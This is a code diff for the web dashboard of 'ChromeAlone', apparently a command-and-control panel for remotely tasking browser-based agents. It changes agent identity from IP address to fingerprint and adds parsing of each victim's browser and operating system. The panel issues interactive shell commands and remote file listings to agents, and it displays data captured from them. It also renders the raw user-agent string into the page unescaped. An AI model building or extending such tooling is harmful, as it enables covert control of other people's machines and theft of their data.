@@ -9,7 +9,7 @@ class ChromeAloneAPI {
         this.currentBrowserPath = '';
         this.currentBrowserAgent = '';
         this.browserHistory = []; // For back/forward navigation
-        this.agentAliases = this.loadAgentAliases(); // IP -> alias mapping
+        this.agentAliases = this.loadAgentAliases(); // fingerprint -> alias mapping
         this.shellHistory = []; // Command history for shell tab
         this.shellHistoryIndex = -1; // Current position in history
         this.shellCurrentAgent = ''; // Currently selected shell agent
@@ -34,6 +34,55 @@ class ChromeAloneAPI {
         } else {
             console.warn('window.ChromeAloneConfig not found, using fallback defaults');
         }
+    }
+
+    parseUserAgent(userAgent) {
+        if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };
+
+        // Browser detection
+        let browser = 'Unknown';
+        if (userAgent.includes('Edg/')) {
+            browser = 'Edge';
+        } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/')) {
+            browser = 'Chrome';
+        } else if (userAgent.includes('Firefox/')) {
+            browser = 'Firefox';
+        } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
+            browser = 'Safari';
+        } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
+            browser = 'Opera';
+        }
+
+        // OS detection
+        let os = 'Unknown';
+        if (userAgent.includes('Windows NT 10.0')) {
+            os = 'Windows 10/11';
+        } else if (userAgent.includes('Windows NT 6.3')) {
+            os = 'Windows 8.1';
+        } else if (userAgent.includes('Windows NT 6.2')) {
+            os = 'Windows 8';
+        } else if (userAgent.includes('Windows NT 6.1')) {
+            os = 'Windows 7';
+        } else if (userAgent.includes('Windows')) {
+            os = 'Windows';
+        } else if (userAgent.includes('Mac OS X')) {
+            const match = userAgent.match(/Mac OS X (\d+)[._](\d+)/);
+            if (match) {
+                os = `macOS ${match[1]}.${match[2]}`;
+            } else {
+                os = 'macOS';
+            }
+        } else if (userAgent.includes('Linux')) {
+            if (userAgent.includes('Android')) {
+                os = 'Android';
+            } else {
+                os = 'Linux';
+            }
+        } else if (userAgent.includes('CrOS')) {
+            os = 'Chrome OS';
+        }
+
+        return { browser, os };
     }
 
     initializeEventListeners() {
@@ -206,17 +255,25 @@ class ChromeAloneAPI {
         }
 
         const agentsHtml = agents.map(agent => {
-            const displayName = this.getAgentDisplayName(agent.ip);
-            const hasAlias = this.agentAliases[agent.ip];
-            const ipInfo = hasAlias ? `<br><strong>IP Address:</strong> ${agent.ip}` : '';
-            
+            const displayName = this.getAgentDisplayName(agent.fingerprint);
+            const hasAlias = this.agentAliases[agent.fingerprint];
+            const fpShort = agent.fingerprint ? agent.fingerprint.substring(0, 16) + '...' : 'N/A';
+
+            // Parse user agent to get browser and OS
+            const uaInfo = this.parseUserAgent(agent.userAgent);
+            const systemInfo = `${uaInfo.browser} on ${uaInfo.os}`;
+
+            // Build additional info section
+            const additionalInfo = hasAlias ?
+                `<br><strong>IP Address:</strong> ${agent.ip || 'N/A'}<br><strong>Fingerprint:</strong> ${fpShort}` :
+                `<br><strong>IP:</strong> ${agent.ip || 'N/A'}`;
+
             return `
                 <div class="agent-card">
                     <div class="agent-header">
                         <div>
                             <span class="status-indicator ${agent.active ? 'status-online' : 'status-offline'}"></span>
                             <strong>${displayName}</strong>
-                            <span class="agent-id">${agent.agentId}</span>
                         </div>
                         <div>
                             <strong>Port:</strong> ${agent.port}
@@ -224,15 +281,25 @@ class ChromeAloneAPI {
                     </div>
                     <div>
                         <strong>Status:</strong> ${agent.active ? 'Online' : 'Offline'}<br>
+                        <strong>System:</strong> ${systemInfo}<br>
+                        <strong>Platform:</strong> ${agent.platform || 'Unknown'}<br>
                         <strong>Connections:</strong> ${agent.connectionCount || 0}<br>
-                        <strong>Last Seen:</strong> ${agent.lastSeen ? new Date(agent.lastSeen).toLocaleString() : 'Never'}${ipInfo}
+                        <strong>Last Seen:</strong> ${agent.lastSeen ? new Date(agent.lastSeen).toLocaleString() : 'Never'}${additionalInfo}
                     </div>
+                    ${agent.userAgent ? `
+                    <details style="margin-top: 10px;">
+                        <summary style="cursor: pointer; color: #3498db;">View User Agent</summary>
+                        <div style="margin-top: 5px; padding: 5px; background: #f8f9fa; border-radius: 4px; font-size: 11px; word-break: break-all;">
+                            ${agent.userAgent}
+                        </div>
+                    </details>
+                    ` : ''}
                     <div style="margin-top: 10px;">
-                        <input type="text" id="alias-${agent.ip}" placeholder="Enter alias..." value="${this.agentAliases[agent.ip] || ''}" style="width: 150px; margin-right: 10px;">
-                        <button onclick="window.chromeAloneAPI.renameAgent('${agent.ip}')" style="padding: 4px 8px; font-size: 12px;">
+                        <input type="text" id="alias-${agent.fingerprint}" placeholder="Enter alias..." value="${this.agentAliases[agent.fingerprint] || ''}" style="width: 150px; margin-right: 10px;">
+                        <button onclick="window.chromeAloneAPI.renameAgent('${agent.fingerprint}')" style="padding: 4px 8px; font-size: 12px;">
                             ${hasAlias ? 'Rename' : 'Set Alias'}
                         </button>
-                        ${hasAlias ? `<button onclick="window.chromeAloneAPI.clearAgentAlias('${agent.ip}')" style="padding: 4px 8px; font-size: 12px; margin-left: 5px; background: #e74c3c;">Clear</button>` : ''}
+                        ${hasAlias ? `<button onclick="window.chromeAloneAPI.clearAgentAlias('${agent.fingerprint}')" style="padding: 4px 8px; font-size: 12px; margin-left: 5px; background: #e74c3c;">Clear</button>` : ''}
                     </div>
                 </div>
             `;
@@ -244,14 +311,14 @@ class ChromeAloneAPI {
     updateAgentSelector(agents) {
         const selector = document.getElementById('targetIp');
         const currentValue = selector.value;
-        
+
         selector.innerHTML = '<option value="">Select an agent...</option>';
-        
+
         if (agents && agents.length > 0) {
             agents.forEach(agent => {
                 const option = document.createElement('option');
-                option.value = agent.ip;
-                const displayName = this.getAgentDisplayName(agent.ip);
+                option.value = agent.fingerprint;
+                const displayName = this.getAgentDisplayName(agent.fingerprint);
                 option.textContent = `${displayName} (${agent.active ? 'Online' : 'Offline'})`;
                 selector.appendChild(option);
             });
@@ -351,7 +418,7 @@ class ChromeAloneAPI {
                 body: JSON.stringify({
                     command,
                     payload,
-                    agentIp: targetIp
+                    fingerprint: targetIp
                 })
             });
 
@@ -365,7 +432,7 @@ class ChromeAloneAPI {
             this.addTaskToHistory({
                 taskId: data.taskId,
                 command: command,
-                agentIp: targetIp,
+                fingerprint: targetIp,
                 payload: payload,
                 status: 'pending'
             });
@@ -502,15 +569,15 @@ class ChromeAloneAPI {
                 break;
             
             case 'task_queued':
-                this.showMessage(`📋 Task ${data.taskId.substring(0, 8)}... queued for ${data.command} on ${data.agentIp}`);
+                this.showMessage(`📋 Task ${data.taskId.substring(0, 8)}... queued for ${data.command} on ${data.fingerprint}`);
                 break;
             
             case 'task_completed':
                 console.log('Task completed SSE event:', data);
-                this.showMessage(`✅ Task ${data.taskId.substring(0, 8)}... completed: ${data.command} on ${data.agentIp}`);
+                this.showMessage(`✅ Task ${data.taskId.substring(0, 8)}... completed: ${data.command} on ${data.fingerprint}`);
                 
                 // Don't update task history for shell commands from Interactive Shell tab
-                if (!(data.command === 'shell' && data.agentIp === this.shellCurrentAgent)) {
+                if (!(data.command === 'shell' && data.fingerprint === this.shellCurrentAgent)) {
                     // Update task history
                     this.updateTaskInHistory(data.taskId, {
                         status: 'completed',
@@ -525,10 +592,10 @@ class ChromeAloneAPI {
                 }
                 
                 // Check if this is a shell command from the Interactive Shell tab
-                if (data.command === 'shell' && data.agentIp === this.shellCurrentAgent) {
+                if (data.command === 'shell' && data.fingerprint === this.shellCurrentAgent) {
                     console.log('Shell command response detected:', { 
                         taskId: data.taskId, 
-                        agentIp: data.agentIp, 
+                        fingerprint: data.fingerprint, 
                         shellCurrentAgent: this.shellCurrentAgent,
                         result: data.result 
                     });
@@ -559,7 +626,7 @@ class ChromeAloneAPI {
                     this.showResponse('taskResponse', {
                         taskId: data.taskId,
                         command: data.command,
-                        agentIp: data.agentIp,
+                        fingerprint: data.fingerprint,
                         status: 'completed',
                         result: displayResult
                     });
@@ -568,10 +635,10 @@ class ChromeAloneAPI {
                 
             case 'task_failed':
                 console.log('Task failed SSE event:', data);
-                this.showMessage(`❌ Task ${data.taskId.substring(0, 8)}... failed: ${data.command} on ${data.agentIp}`, true);
+                this.showMessage(`❌ Task ${data.taskId.substring(0, 8)}... failed: ${data.command} on ${data.fingerprint}`, true);
                 
                 // Don't update task history for shell commands from Interactive Shell tab
-                if (!(data.command === 'shell' && data.agentIp === this.shellCurrentAgent)) {
+                if (!(data.command === 'shell' && data.fingerprint === this.shellCurrentAgent)) {
                     // Update task history
                     this.updateTaskInHistory(data.taskId, {
                         status: 'failed',
@@ -581,10 +648,10 @@ class ChromeAloneAPI {
                 }
                 
                 // Check if this is a shell command from the Interactive Shell tab
-                if (data.command === 'shell' && data.agentIp === this.shellCurrentAgent) {
+                if (data.command === 'shell' && data.fingerprint === this.shellCurrentAgent) {
                     console.log('Shell command failed:', { 
                         taskId: data.taskId, 
-                        agentIp: data.agentIp, 
+                        fingerprint: data.fingerprint, 
                         error: data.error || data.result
                     });
                     this.addShellOutput(`Error: ${data.error || data.result || 'Command failed'}`, 'shell-error');
@@ -593,12 +660,12 @@ class ChromeAloneAPI {
                 break;
                 
             case 'captured_data':
-                this.showMessage(`📊 Data captured from ${data.agentIp}: ${data.dataType || 'unknown type'}`);
+                this.showMessage(`📊 Data captured from ${data.fingerprint}: ${data.dataType || 'unknown type'}`);
                 
                 // Add captured data to history (similar to tasks but different format)
                 this.addCapturedDataToHistory({
                     agentId: data.agentId,
-                    agentIp: data.agentIp,
+                    fingerprint: data.fingerprint,
                     dataType: data.dataType,
                     data: data.data,
                     timestamp: data.timestamp
@@ -839,7 +906,7 @@ class ChromeAloneAPI {
         const currentValue = filter.value;
         
         // Get unique agent IPs from task history only
-        const agentIPs = [...new Set(this.taskHistory.map(task => task.agentIp))].sort();
+        const agentIPs = [...new Set(this.taskHistory.map(task => task.fingerprint))].sort();
         
         filter.innerHTML = '<option value="">All Agents</option>';
         agentIPs.forEach(ip => {
@@ -863,7 +930,7 @@ class ChromeAloneAPI {
         // Filter task history only (no captured data)
         let filteredTasks = this.taskHistory;
         if (filter) {
-            filteredTasks = this.taskHistory.filter(task => task.agentIp === filter);
+            filteredTasks = this.taskHistory.filter(task => task.fingerprint === filter);
         }
         
         // Sort by timestamp (most recent first)
@@ -917,7 +984,7 @@ class ChromeAloneAPI {
                     </div>
                     <div class="task-details">
                         <div><strong>Command:</strong> ${task.command}</div>
-                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(task.agentIp, true)}</div>
+                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(task.fingerprint, true)}</div>
                         <div><strong>Payload:</strong> ${this.escapeHtml(task.payload || 'N/A')}</div>
                     </div>
                     ${resultHtml}
@@ -938,7 +1005,7 @@ class ChromeAloneAPI {
         let filteredData = this.capturedDataHistory;
         
         if (agentFilter) {
-            filteredData = filteredData.filter(item => item.agentIp === agentFilter);
+            filteredData = filteredData.filter(item => item.fingerprint === agentFilter);
         }
         
         if (contentFilter) {
@@ -982,7 +1049,7 @@ class ChromeAloneAPI {
                     </div>
                     <div class="task-details">
                         <div><strong>Data Type:</strong> ${item.dataType || 'Unknown'}</div>
-                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(item.agentIp, true)}</div>
+                        <div><strong>Agent:</strong> ${this.getAgentDisplayName(item.fingerprint, true)}</div>
                         <div><strong>Agent ID:</strong> ${item.agentId}</div>
                     </div>
                     <div style="margin-top: 10px;">
@@ -1002,7 +1069,7 @@ class ChromeAloneAPI {
         const agentFilter = document.getElementById('capturedAgentFilter');
         const currentAgentValue = agentFilter.value;
         
-        const agentIPs = [...new Set(this.capturedDataHistory.map(item => item.agentIp))].sort();
+        const agentIPs = [...new Set(this.capturedDataHistory.map(item => item.fingerprint))].sort();
         
         agentFilter.innerHTML = '<option value="">All Agents</option>';
         agentIPs.forEach(ip => {
@@ -1099,8 +1166,8 @@ class ChromeAloneAPI {
             agents.forEach(agent => {
                 if (agent.active) { // Only show active agents for file browsing
                     const option = document.createElement('option');
-                    option.value = agent.ip;
-                    const displayName = this.getAgentDisplayName(agent.ip);
+                    option.value = agent.fingerprint;
+                    const displayName = this.getAgentDisplayName(agent.fingerprint);
                     option.textContent = `${displayName} (Online)`;
                     selector.appendChild(option);
                 }
@@ -1114,10 +1181,10 @@ class ChromeAloneAPI {
     }
 
     startFileBrowser() {
-        const agentIp = document.getElementById('browserAgentSelect').value;
+        const fingerprint = document.getElementById('browserAgentSelect').value;
         const startPath = document.getElementById('browserStartPath').value.trim();
         
-        if (!agentIp) {
+        if (!fingerprint) {
             this.showMessage('Please select an agent first', true);
             return;
         }
@@ -1127,7 +1194,7 @@ class ChromeAloneAPI {
             return;
         }
         
-        this.currentBrowserAgent = agentIp;
+        this.currentBrowserAgent = fingerprint;
         this.currentBrowserPath = startPath;
         this.browserHistory = [startPath];
         
@@ -1160,14 +1227,14 @@ class ChromeAloneAPI {
         this.executeLsCommand(this.currentBrowserAgent, path);
     }
 
-    async executeLsCommand(agentIp, path) {
+    async executeLsCommand(fingerprint, path) {
         try {
             const data = await this.makeRequest('/command', {
                 method: 'POST',
                 body: JSON.stringify({
                     command: 'ls',
                     payload: path,
-                    agentIp: agentIp
+                    fingerprint: fingerprint
                 })
             });
             
@@ -1728,7 +1795,7 @@ class ChromeAloneAPI {
             const data = await this.makeRequest('/command', {
                 method: 'POST',
                 body: JSON.stringify({
-                    agentIp: this.shellCurrentAgent,
+                    fingerprint: this.shellCurrentAgent,
                     command: 'shell',
                     payload: payload
                 })
@@ -1827,8 +1894,8 @@ class ChromeAloneAPI {
             agents.forEach(agent => {
                 if (agent.active) { // Only show active agents
                     const option = document.createElement('option');
-                    option.value = agent.ip;
-                    const displayName = this.getAgentDisplayName(agent.ip);
+                    option.value = agent.fingerprint;
+                    const displayName = this.getAgentDisplayName(agent.fingerprint);
                     option.textContent = displayName;
                     selector.appendChild(option);
                 }
